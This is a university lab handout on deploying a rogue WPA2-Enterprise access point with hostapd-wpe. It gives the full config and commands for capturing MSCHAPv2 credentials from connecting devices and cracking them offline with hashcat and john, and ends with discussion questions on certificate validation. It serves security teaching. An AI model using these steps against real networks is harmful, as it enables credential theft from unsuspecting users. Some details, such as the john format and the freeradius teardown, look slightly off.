## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** WPA2-Enterprise Phishing & Offline Cracking  
**Author:** Dr Ayman El Hajjar  

---

# Lab: Rogue WPA2-Enterprise AP and MSCHAPv2 Capture

---

### Objective

Deploy a rogue access point mimicking a WPA2-Enterprise network using a fake RADIUS server.  
Capture MSCHAPv2 credentials and attempt offline password cracking.

---

## Requirements

- Kali Linux or Raspberry Pi with external Wi-Fi adapter
- `hostapd-wpe` or `eaphammer` (included in Kali)
- `hashcat` or `john` for cracking
- A victim device configured for WPA2-Enterprise

---

## Step-by-Step Instructions

### 1. Configure the Rogue AP

- Create `hostapd-wpe.conf`:
```bash
interface=lab-wlan
driver=nl80211
ssid=6CSEF005W_WPA2_ENTERPRISE_AP
channel=6
hw_mode=g
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
ieee8021x=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
```
- Start the rogue AP:

```bash
sudo hostapd-wpe hostapd-wpe.conf
```
### 2. Monitor for Authentication Attempts

- Check output or logs for MSCHAPv2 challenge/response:

```csharp
[WPE] Challenge: <hex>
[WPE] Response: <hex>
```
- Save the values for offline cracking.

### 3. Crack the Hash Offline
- Using `hashcat` (`mode 5500`):

```bash
hashcat -m 5500 captured.hash /usr/share/wordlists/rockyou.txt
```

- or using `john`

```bash
john --format=chap captured.txt --wordlist=rockyou.txt
```
### Discussion Points
- Why is WPA2-Enterprise vulnerable to phishing?
- What role do server certificates play?
- Would validating certificates prevent this attack?

## Teardown
```bash
sudo pkill hostapd
sudo pkill freeradius
```
